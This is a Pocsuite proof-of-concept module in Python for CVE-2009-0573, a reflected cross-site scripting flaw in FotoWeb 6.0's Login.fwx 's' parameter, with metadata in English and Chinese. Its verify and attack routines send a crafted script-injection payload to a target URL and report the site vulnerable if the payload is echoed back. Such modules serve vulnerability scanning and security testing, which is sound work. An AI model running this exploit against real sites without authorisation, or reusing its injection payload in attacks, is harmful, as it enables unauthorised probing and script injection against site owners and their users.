#!/usr/bin/env python
# coding: utf-8

from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
from urlparse import urljoin

class TestPOC(POCBase):
    vulID = 'SSV-86055'  # vul ID
    version = '1'
    author = 'hhxx'
    vulDate = '2009-02-09'
    createDate = '2015-10-22'
    updateDate = '2015-10-22'
    references = ['https://www.exploit-db.com/exploits/32782/']
    name = "FotoWeb 6.0 Login.fwx s Parameter XSS"
    appPowerLink = 'www.fotoware.com'
    appName = 'FotoWeb'
    appVersion = '6.0'
    vulType = 'XSS'
    desc = '''  
        FotoWeb 是针对网站发布内容包括文档、图片、pdf、视频等实现归档的工具。 
        FotoWeb 6.0 (Build 273)版本中存在多个跨站脚本攻击漏洞。
        远程攻击者可以借助(1)对cmdrequest/Login.fwx的s参数和(2)对Grid.fwx的搜索参数，
        注入任意web脚本或HTML。
        CVEID:CVE-2009-0573
        CNNVDID:CNNVD-200902-327
    '''
    # the sample sites for examine
    samples = ['']

    def _verify(self):
        payload = '/fotoweb/cmdrequest/Login.fwx?s="><script>alert(/Sebug23333Test/)</script>'
        res = req.get(urljoin(self.url, payload), timeout=5)
        return self.parse_verify(res, payload, 'xss')

    def parse_verify(self, res, payload, type):
        output = Output(self)
        result = {}
        if  type == 'xss' and '>alert(/Sebug23333Test/)' in res.content:
            #返回页面包含构造的特殊字段，说明xss存在
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = urljoin(self.url, payload)
            output.success(result)           
        else:
            output.fail('Internet Nothing returned')
        return output

    def _attack(self): 
        return self._verify()

register(TestPOC)